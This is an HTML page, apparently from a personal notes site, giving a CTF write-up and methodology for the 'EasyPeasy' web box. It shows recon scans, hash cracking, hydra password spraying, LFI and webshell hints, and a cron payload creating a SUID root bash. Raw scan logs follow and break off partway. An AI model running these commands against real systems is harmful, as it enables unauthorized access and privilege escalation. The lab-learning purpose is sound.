+  
+  
+  <span class="md-ellipsis">
+    Optimization
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Kaggle
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Kaggle
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../kaggle/competitions/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Competitions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../kaggle/eda/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    EDA
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../kaggle/feature-engineering/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Feature Engineering
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../kaggle/models/_index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Models
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#folder-layout-local-repo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Folder Layout (Local → Repo)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#learning-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      Learning Objectives
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0-rules-lab-hygiene" class="md-nav__link">
+    <span class="md-ellipsis">
+      0) Rules &amp; Lab Hygiene
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      1) Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1) Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-host-discovery-port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.1 Host Discovery &amp; Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-web-surface-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.2 Web Surface Mapping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13-wordlists-content-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      1.3 Wordlists &amp; Content Discovery
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-from-clues-to-credentials-decoding-hashing-101" class="md-nav__link">
+    <span class="md-ellipsis">
+      2) From Clues to Credentials (Decoding &amp; Hashing 101)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2) From Clues to Credentials (Decoding &amp; Hashing 101)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21-recognize-encodings-by-eye" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.1 Recognize Encodings by Eye
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22-hash-identification" class="md-nav__link">
+    <span class="md-ellipsis">
+      2.2 Hash Identification
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-exploitation-turning-findings-into-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      3) Exploitation (Turning Findings into Access)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3) Exploitation (Turning Findings into Access)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#31-common-web-flows" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.1 Common Web Flows
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#32-shell-stabilization" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.2 Shell Stabilization
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-privilege-escalation-linux-patterns" class="md-nav__link">
+    <span class="md-ellipsis">
+      4) Privilege Escalation (Linux Patterns)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4) Privilege Escalation (Linux Patterns)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-suid-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.1 SUID / Capabilities
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-weak-service-files-cron" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.2 Weak Service Files / Cron
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-path-hijacking-insecure-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      4.3 Path Hijacking / Insecure Scripts
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-post-exploitation-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      5) Post-Exploitation Notes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cheat-sheet-reusable" class="md-nav__link">
+    <span class="md-ellipsis">
+      6) Cheat Sheet (Reusable)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-run-log-your-original-notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      7) Run Log (Your Original Notes)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-afteraction-review-aar" class="md-nav__link">
+    <span class="md-ellipsis">
+      8) After‑Action Review (AAR)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#appendix-a-quick-theory-nuggets" class="md-nav__link">
+    <span class="md-ellipsis">
+      Appendix A — Quick Theory Nuggets
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Appendix A — Quick Theory Nuggets">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#a1-setuid-in-one-minute" class="md-nav__link">
+    <span class="md-ellipsis">
+      A.1 Setuid in One Minute
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a2-why-sc-sv" class="md-nav__link">
+    <span class="md-ellipsis">
+      A.2 Why -sC -sV?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credits" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credits
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">CTF</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Enumeration</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Exploitation</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Privilege Escalation</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">Web</span>
+      
+    
+  </nav>
+
+
+
+  <h1>EasyPeasy (Web)</h1>
+
+<div class="admonition info">
+<p class="admonition-title">Goal</p>
+<p>Solve <em>EasyPeasy</em> end‑to‑end <strong>and</strong> learn a reusable methodology you can apply to most beginner–intermediate web CTFs.<br />
+You’ll see <em>what</em> to do, <em>why</em> it works, and the mental models behind each step.</p>
+</div>
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Map the attack surface → <strong>nmap</strong> + <strong>HTTP recon</strong></li>
+<li>Find lightweight clues → <code>/robots.txt</code>, hidden notes, wordlists</li>
+<li>Pivot from hints to execution → decode/encode, brute logical steps, avoid rabbit holes</li>
+<li>Privesc via capabilities/SUID or misconfig (illustrative patterns shown below)</li>
+</ul>
+<hr />
+<h2 id="folder-layout-local-repo">Folder Layout (Local → Repo)<a class="headerlink" href="#folder-layout-local-repo" title="Permanent link">&para;</a></h2>
+<p>Your local artifacts (from your machine):</p>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">makar</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">easypeasyctf</span>
+<span class="err">├──</span><span class="w"> </span><span class="mf">10.201</span><span class="o">.</span><span class="mf">72.248</span><span class="p">:</span><span class="mi">65524</span><span class="o">/</span><span class="w">      </span><span class="c1"># scraped pages or downloaded content</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">binarycodepixabay</span><span class="o">.</span><span class="n">jpg</span><span class="w">     </span><span class="c1"># stego candidate (if any)</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">easypeasy_1596838725703</span><span class="o">.</span><span class="n">txt</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">easypeasyctf_nmap</span><span class="w">         </span><span class="c1"># nmap output(s)</span>
+<span class="err">├──</span><span class="w"> </span><span class="n">easypeasyctf_writeup</span><span class="w">      </span><span class="c1"># your original notes (source of truth)</span>
+<span class="err">├──</span><span class="w"> </span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span><span class="w">                  </span><span class="c1"># hashes found during the run</span>
+<span class="err">└──</span><span class="w"> </span><span class="n">secrettext</span><span class="o">.</span><span class="n">txt</span><span class="w">            </span><span class="c1"># suspicious clues/notes</span>
+</code></pre></div>
+
+<p>Where this page should live in your Git repo:</p>
+<div class="codehilite"><pre><span></span><code>~/kareem-notes-pro/docs/ctf/web/easypeasy-ctf/README.md
+</code></pre></div>
+
+<hr />
+<h2 id="learning-objectives">Learning Objectives<a class="headerlink" href="#learning-objectives" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong>Enumeration Mindset:</strong> Turn vague surfaces into concrete leads systematically.</li>
+<li><strong>Signal vs Noise:</strong> Recognize <em>actionable</em> clues (hashes, encodings, hidden paths).</li>
+<li><strong>Tool→Theory Bridge:</strong> Understand the protocol/encoding <em>behind</em> the tool output.</li>
+<li><strong>Repeatable Playbook:</strong> Export your steps as a reusable checklist/cheatsheet.</li>
+</ol>
+<hr />
+<h2 id="0-rules-lab-hygiene">0) Rules &amp; Lab Hygiene<a class="headerlink" href="#0-rules-lab-hygiene" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Stay inside the CTF scope (host/IP provided by the platform).  </li>
+<li>Log everything: timestamps, commands, outputs, and conclusions right next to them.  </li>
+<li>Use a <strong>scratchpad → narrative</strong> flow (you did this via <code>easypeasyctf_writeup</code>).</li>
+</ul>
+<hr />
+<h2 id="1-reconnaissance">1) Reconnaissance<a class="headerlink" href="#1-reconnaissance" title="Permanent link">&para;</a></h2>
+<h3 id="11-host-discovery-port-scan">1.1 Host Discovery &amp; Port Scan<a class="headerlink" href="#11-host-discovery-port-scan" title="Permanent link">&para;</a></h3>
+<p>Use a quick top-ports scan to find open services, then a full scan if needed.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Quick scan</span>
+nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-vv<span class="w"> </span>-oN<span class="w"> </span>easypeasyctf_nmap<span class="w"> </span>&lt;TARGET_IP&gt;
+
+<span class="c1"># If the target uses a non-default port you already know (e.g., 65524), include it:</span>
+nmap<span class="w"> </span>-Pn<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">65524</span><span class="w"> </span>-vv<span class="w"> </span>-oN<span class="w"> </span>easypeasyctf_nmap_specific<span class="w"> </span>&lt;TARGET_IP&gt;
+
+<span class="c1"># Optional: full range + UDP (heavier)</span>
+nmap<span class="w"> </span>-Pn<span class="w"> </span>-p-<span class="w"> </span>-sV<span class="w"> </span>-oN<span class="w"> </span>easypeasyctf_nmap_all<span class="w"> </span>&lt;TARGET_IP&gt;
+</code></pre></div>
+
+<p><strong>Why these flags?</strong>
+- <code>-sC</code> runs default scripts (safe discovery of common misconfigs).
+- <code>-sV</code> fingerprints service versions → feeds Google/CVE lookups.
+- <code>-Pn</code> avoids unreliable ping checks in lab firewall/NAT setups.</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Keep <strong>one canonical nmap file</strong> per box with the <em>best</em> information; keep others for experiments.</p>
+</div>
+<h3 id="12-web-surface-mapping">1.2 Web Surface Mapping<a class="headerlink" href="#12-web-surface-mapping" title="Permanent link">&para;</a></h3>
+<p>If HTTP/HTTPS is open:</p>
+<div class="codehilite"><pre><span></span><code>whatweb<span class="w"> </span>http://&lt;TARGET_IP&gt;:&lt;PORT&gt;
+curl<span class="w"> </span>-I<span class="w"> </span>http://&lt;TARGET_IP&gt;:&lt;PORT&gt;/
+</code></pre></div>
+
+<p>Then check the usual low-hanging fruit:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># robots, sitemap, server headers, source comments</span>
+curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;TARGET&gt;:&lt;PORT&gt;/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;TARGET&gt;:&lt;PORT&gt;/<span class="w"> </span><span class="p">|</span><span class="w"> </span>pup<span class="w"> </span><span class="s1">&#39;a attr{href}&#39;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;TARGET&gt;:&lt;PORT&gt;/<span class="w"> </span><span class="p">|</span><span class="w"> </span>pup<span class="w"> </span><span class="s1">&#39;script,link,meta&#39;</span>
+</code></pre></div>
+
+<p><strong>Why this matters:</strong> robots/sitemap and HTML comments often leak <strong>keywords, usernames, hidden paths, or encodings</strong> that chain later.</p>
+<h3 id="13-wordlists-content-discovery">1.3 Wordlists &amp; Content Discovery<a class="headerlink" href="#13-wordlists-content-discovery" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;TARGET&gt;:&lt;PORT&gt;/<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt<span class="w"> </span>-o<span class="w"> </span>gobuster_common.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">50</span>
+<span class="c1"># If hints mention &#39;easy&#39;, &#39;peasy&#39;, &#39;chocolate&#39;, try themed custom lists as well.</span>
+</code></pre></div>
+
+<p><strong>Model:</strong> <em>Hypothesis-driven brute force.</em> Start with common lists; guide deeper by clues you’ve already found.</p>
+<hr />
+<h2 id="2-from-clues-to-credentials-decoding-hashing-101">2) From Clues to Credentials (Decoding &amp; Hashing 101)<a class="headerlink" href="#2-from-clues-to-credentials-decoding-hashing-101" title="Permanent link">&para;</a></h2>
+<h3 id="21-recognize-encodings-by-eye">2.1 Recognize Encodings by Eye<a class="headerlink" href="#21-recognize-encodings-by-eye" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Base64</strong>: Looks like <code>A–Z a–z 0–9 + /</code> with <code>=</code> padding. Try:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;c2VjcmV0&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</code></pre></div>
+
+<ul>
+<li><strong>Hex</strong>: pairs of <code>[0-9a-f]</code>. Try:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;74657374&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xxd<span class="w"> </span>-r<span class="w"> </span>-p
+</code></pre></div>
+
+<ul>
+<li><strong>URL-encoding</strong>: <code>%2f</code>, <code>%3a</code>… Use <code>python -c</code> or <code>urldecode</code>.</li>
+<li><strong>ROT/N</strong>: letters shifted; <code>rot13</code> or <code>cyberchef</code>.</li>
+<li><strong>Stego suspects</strong>: Images with <strong>EXIF oddities</strong> or appended data:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>exiftool<span class="w"> </span>binarycodepixabay.jpg
+strings<span class="w"> </span>-n<span class="w"> </span><span class="m">8</span><span class="w"> </span>binarycodepixabay.jpg<span class="w"> </span><span class="p">|</span><span class="w"> </span>less
+binwalk<span class="w"> </span>-eM<span class="w"> </span>binarycodepixabay.jpg
+</code></pre></div>
+
+<h3 id="22-hash-identification">2.2 Hash Identification<a class="headerlink" href="#22-hash-identification" title="Permanent link">&para;</a></h3>
+<p>Use <code>hashid</code>/<code>hash-identifier</code>:</p>
+<div class="codehilite"><pre><span></span><code>hashid<span class="w"> </span>-m<span class="w"> </span>-j<span class="w"> </span>hash.txt
+</code></pre></div>
+
+<p>If it’s a crackable fast hash (MD5/SHA1/NTLM), try <strong>rockyou</strong> quickly:</p>
+<div class="codehilite"><pre><span></span><code>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hash.txt
+<span class="c1"># or</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span>&lt;mode&gt;<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+
+<hr />
+<h2 id="3-exploitation-turning-findings-into-access">3) Exploitation (Turning Findings into Access)<a class="headerlink" href="#3-exploitation-turning-findings-into-access" title="Permanent link">&para;</a></h2>
+<h3 id="31-common-web-flows">3.1 Common Web Flows<a class="headerlink" href="#31-common-web-flows" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Leaked creds</strong> → <code>/login</code> or basic auth.  </li>
+<li><strong>LFI/RFI</strong> → read <code>/etc/passwd</code> or app configs.  </li>
+<li><strong>Upload bypass</strong> → webshell (php, aspx) with extension or MIME tricks.  </li>
+<li><strong>Weak cookies/JWT</strong> → forge or decode to escalate roles.</li>
+</ul>
+<p>Example: If a hint reveals a <em>password theme</em> (e.g., <code>easy-peasy-&lt;year&gt;</code>), build a small custom list and try:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># password spraying example with hydra</span>
+hydra<span class="w"> </span>-l<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-P<span class="w"> </span>easy_peasy_custom.txt<span class="w"> </span>http-get://&lt;TARGET&gt;:&lt;PORT&gt;/login
+</code></pre></div>
+
+<h3 id="32-shell-stabilization">3.2 Shell Stabilization<a class="headerlink" href="#32-shell-stabilization" title="Permanent link">&para;</a></h3>
+<p>Once you land a shell:</p>
+<div class="codehilite"><pre><span></span><code>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+CTRL+Z
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</code></pre></div>
+
+<hr />
+<h2 id="4-privilege-escalation-linux-patterns">4) Privilege Escalation (Linux Patterns)<a class="headerlink" href="#4-privilege-escalation-linux-patterns" title="Permanent link">&para;</a></h2>
+<h3 id="41-suid-capabilities">4.1 SUID / Capabilities<a class="headerlink" href="#41-suid-capabilities" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># SUID hunting</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Capabilities</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<p>If you see unusual SUID binaries (custom scripts, older interpreters), check GTFOBins patterns.</p>
+<h3 id="42-weak-service-files-cron">4.2 Weak Service Files / Cron<a class="headerlink" href="#42-weak-service-files-cron" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>systemctl<span class="w"> </span>list-timers<span class="w"> </span>--all
+cat<span class="w"> </span>/etc/crontab
+ls<span class="w"> </span>-l<span class="w"> </span>/etc/cron.*/*
+</code></pre></div>
+
+<ul>
+<li>World-writable scripts run as root? Replace payload safely to get a root shell.  </li>
+<li><strong>Important:</strong> Prefer a <strong>file-drop + root-owned SUID bash</strong> method during CTF; <em>do not</em> use destructive payloads.</li>
+</ul>
+<p>Example payload (explain‑and‑learn):</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># i will run as root</span>
+/bin/cp<span class="w"> </span>/bin/bash<span class="w"> </span>/tmp/bashroot
+/bin/chown<span class="w"> </span>root:root<span class="w"> </span>/tmp/bashroot
+/bin/chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>/tmp/bashroot
+</code></pre></div>
+
+<p><strong>Why it works:</strong><br />
+Setuid bit (4) on a root‑owned binary lets regular users execute it <strong>with effective UID 0</strong>. Running <code>/tmp/bashroot -p</code> yields a root shell in a contained lab. Remove after use.</p>
+<h3 id="43-path-hijacking-insecure-scripts">4.3 Path Hijacking / Insecure Scripts<a class="headerlink" href="#43-path-hijacking-insecure-scripts" title="Permanent link">&para;</a></h3>
+<p>Search for scripts that call <code>/bin/sh</code> or unsanitized <code>$PATH</code>:</p>
+<div class="codehilite"><pre><span></span><code>grep<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;sh &quot;</span><span class="w"> </span>/etc/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head
+strings<span class="w"> </span>/usr/local/bin/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;(/bin/sh|sudo|scp|tar)&#39;</span>
+</code></pre></div>
+
+<hr />
+<h2 id="5-post-exploitation-notes">5) Post-Exploitation Notes<a class="headerlink" href="#5-post-exploitation-notes" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Read flags, capture exact paths.</li>
+<li>Enumerate interesting files: <code>/var/www/</code>, <code>/home/*/.ssh/</code>, <code>/opt/</code> apps.</li>
+<li>Screenshot or copy small configs that explain the <em>root cause</em> (education &gt; just the flag).</li>
+</ul>
+<hr />
+<h2 id="6-cheat-sheet-reusable">6) Cheat Sheet (Reusable)<a class="headerlink" href="#6-cheat-sheet-reusable" title="Permanent link">&para;</a></h2>
+<p><strong>Enumeration</strong></p>
+<div class="codehilite"><pre><span></span><code>nmap -Pn -sC -sV -oN scan.txt &lt;ip&gt;
+whatweb http://&lt;ip&gt;:&lt;port&gt;
+gobuster dir -u http://&lt;ip&gt;:&lt;port&gt;/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div>
+
+<p><strong>Decoding</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="n">base64</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="n">xxd</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">rot13</span><span class="p">,</span><span class="w"> </span><span class="n">urldecode</span>
+<span class="n">exiftool</span><span class="o">/</span><span class="n">binwalk</span><span class="o">/</span><span class="n">strings</span><span class="w"> </span><span class="p">(</span><span class="k">for</span><span class="w"> </span><span class="n">images</span><span class="o">/</span><span class="n">binaries</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>Privesc</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="nx">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="nx">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="o">-</span><span class="k">type</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="mi">2</span><span class="p">&gt;</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span>
+<span class="nx">getcap</span><span class="w"> </span><span class="o">-</span><span class="nx">r</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="p">&gt;</span><span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span>
+<span class="nx">cat</span><span class="w"> </span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">crontab</span><span class="p">;</span><span class="w"> </span><span class="nx">systemctl</span><span class="w"> </span><span class="nx">list</span><span class="o">-</span><span class="nx">timers</span><span class="w"> </span><span class="o">--</span><span class="nx">all</span>
+</code></pre></div>
+
+<hr />
+<h2 id="7-run-log-your-original-notes">7) Run Log (Your Original Notes)<a class="headerlink" href="#7-run-log-your-original-notes" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Keep raw notes to preserve how you reasoned under uncertainty. This is gold for learning.</p>
+</blockquote>
+<details>
+<summary>Click to expand raw notes</summary>
+
+
+<div class="codehilite"><pre><span></span><code>sudo openvpn &#39;vpn/Karma.47 (3).ovpn&#39;
+PS C:\Users\makar&gt; ./wsl-vpn-routes.ps1
+
+# Nmap 7.94SVN scan initiated Tue Sep  2 08:19:32 2025 as: nmap -p- -A -T4 -v -oN easypeasyctf_nmap 10.201.72.248
+Warning: 10.201.72.248 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.201.72.248
+Host is up (0.23s latency).
+Not shown: 65440 closed tcp ports (conn-refused), 92 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+| http-methods:
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.16.1
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+| http-robots.txt: 1 disallowed entry
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep  2 08:51:00 2025 -- 1 IP address (1 host up) scanned in 1888.23 seconds
+
+makar@LAPTOP-ASUME87D:~  % gobuster dir -u http://10.201.72.248/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/hidden               (Status: 301) [Size: 169] [--&gt; http://10.201.72.248/hidden/]
+/index.html           (Status: 200) [Size: 612]
+/robots.txt           (Status: 200) [Size: 43]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+makar@LAPTOP-ASUME87D:~/CTFs/easypeasyctf  % gobuster dir -u http://10.201.72.248/hidden/ -w /home/makar/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.72.248/hidden/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/makar/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
